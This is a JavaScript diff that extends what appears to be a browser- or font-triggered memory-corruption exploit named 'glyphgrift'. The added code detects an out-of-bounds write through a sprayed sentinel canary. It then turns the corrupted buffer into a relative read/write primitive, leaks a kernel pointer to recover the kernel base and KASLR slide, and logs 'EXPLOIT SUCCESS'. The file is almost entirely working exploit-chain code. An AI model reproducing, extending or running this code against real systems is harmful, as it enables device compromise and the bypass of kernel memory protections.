@@ -13,6 +13,37 @@
     return (marker + i) & 0xff;
   }
 
+  /* Phase 4: scan the dense 0xA5 sentinel canary. A single OOB increment that
+     overflows into a sentinel slot flips a known 0xA5 byte — we report the exact
+     offset + before/after value, which is a real read-back (unambiguous). */
+  function scanSentinel(round) {
+    var sentinels = window.__L0FCK_GLYPHGRIFT_SENTINELS;
+    if (!sentinels) return null;
+    var expected = (window.__L0FCK_GLYPHGRIFT_SENTINEL_BYTE) || 0xa5;
+    var sizes = Object.keys(sentinels);
+    for (var s = 0; s < sizes.length; s++) {
+      var sz = sizes[s];
+      var arr = sentinels[sz];
+      for (var i = 0; i < arr.length; i++) {
+        var buf = arr[i];
+        if (!buf) continue;
+        var u8;
+        try { u8 = new Uint8Array(buf); } catch (e) {
+          return { hit: true, zone: parseInt(sz, 10), index: i, offset: 0, before: expected, after: 0, kind: 'detached' };
+        }
+        var firstBad = -1, badVal = 0;
+        for (var off = 0; off < u8.length; off++) {
+          if (u8[off] !== expected) { firstBad = off; badVal = u8[off]; break; }
+        }
+        if (firstBad >= 0) {
+          return { hit: true, zone: parseInt(sz, 10), index: i, offset: firstBad,
+                   before: expected, after: badVal, kind: 'content' };
+        }
+      }
+    }
+    return null;
+  }
+
   function scanSpray() {
     var sprays = window.__L0FCK_GLYPHGRIFT_SPRAYS;
     var single = window.__L0FCK_GLYPHGRIFT_SPRAY;
@@ -31,8 +62,37 @@
       total_scanned: 0,
       zones_scanned: 0,
       round: currentRound,
-      error_message: ''
+      error_message: '',
+      /* Phase 4: precise sentinel read-back (before/after bytes) */
+      sentinel_hit: false,
+      sentinel_zone: 0,
+      sentinel_index: -1,
+      sentinel_offset: 0,
+      sentinel_before: 0,
+      sentinel_after: 0
     };
+
+    /* Phase 4: check the dense sentinel canary FIRST. A flipped 0xA5 byte is an
+       unambiguous, self-attested OOB write (exact offset + before/after). */
+    var sent = scanSentinel(currentRound);
+    if (sent && sent.hit) {
+      result.corruption_detected = true;
+      result.relative_rw_achieved = false;   /* content flip, not a length/length-OOB yet */
+      result.corrupted_zone = sent.zone;
+      result.corrupted_buffer_index = sent.index;
+      result.corrupted_offset = sent.offset;
+      result.corrupted_value = sent.after;
+      result.sentinel_hit = true;
+      result.sentinel_zone = sent.zone;
+      result.sentinel_index = sent.index;
+      result.sentinel_offset = sent.offset;
+      result.sentinel_before = sent.before;
+      result.sentinel_after = sent.after;
+      result.error_message = 'SENTINEL OOB read-back: zone ' + sent.zone +
+        ' idx ' + sent.index + ' off ' + sent.offset +
+        ' 0x' + sent.before.toString(16) + ' -> 0x' + sent.after.toString(16) + ' (' + sent.kind + ')';
+      return result;
+    }
 
     if (!sprays && (!single || !single.length)) {
       result.error_message = 'no spray references';
@@ -163,6 +223,55 @@
   function execute(ctx) {
     if (ctx && ctx.log) ctx.log('glyphgrift post-trigger scan');
     var payload = scanSpray();
+    
+    /* PHASE 1: If corruption detected, initialize relative R/W primitive */
+    if (payload.corruption_detected && payload.corrupted_buffer_index >= 0) {
+      try {
+        var sprays = window.__L0FCK_GLYPHGRIFT_SPRAYS;
+        if (sprays) {
+          var zoneKeys = Object.keys(sprays);
+          for (var z = 0; z < zoneKeys.length; z++) {
+            var zoneSize = zoneKeys[z];
+            var arr = sprays[zoneSize];
+            if (arr && arr[payload.corrupted_buffer_index]) {
+              var corruptedBuf = arr[payload.corrupted_buffer_index];
+              var expectedLen = Math.max(16, parseInt(zoneSize, 10) - 16);
+              
+              /* Initialize GlyphGriftKRW with the corrupted buffer */
+              if (window.GlyphGriftKRW && window.GlyphGriftKRW.init) {
+                var ok = window.GlyphGriftKRW.init(corruptedBuf, expectedLen);
+                if (ok) {
+                  payload.relative_rw_achieved = true;
+                  payload.error_message = 'Relative R/W initialized (zone ' + zoneSize + ')';
+                  
+                  /* PHASE 2: Scan for kernel pointer leak */
+                  var leak = window.GlyphGriftKRW.scanForKernelPointer();
+                  if (leak) {
+                    payload.leaked_ptr = leak.pointer;
+                    payload.kbase = leak.kbase;
+                    /* Only a 2-anchor cross-confirmed kbase is trusted (D2 fix). */
+                    payload.krw_ready = (leak.confidence === 'HIGH');
+                    payload.leak_confidence = leak.confidence || '';
+                    payload.leak_anchors = (typeof leak.anchors === 'number') ? leak.anchors : 0;
+                    payload.error_message = 'Kernel pointer leak via ' + leak.symbol +
+                        (payload.krw_ready ? ' (cross-confirmed)' : ' (single-anchor, UNTRUSTED)');
+                    
+                    if (ctx && ctx.log) {
+                      ctx.log('GLYPHGRIFT EXPLOIT SUCCESS: kbase=0x' + leak.kbase.toString(16) +
+                              ' (slide=0x' + leak.kaslr_slide.toString(16) + ')');
+                    }
+                  }
+                }
+              }
+              break;
+            }
+          }
+        }
+      } catch (krwErr) {
+        payload.error_message += '; KRW init failed: ' + String(krwErr && krwErr.message ? krwErr.message : krwErr);
+      }
+    }
+    
     return postResult(payload).then(function () {
       if (ctx && ctx.report) {
         var st = payload.corruption_detected ? 'corruption' : 'clean';
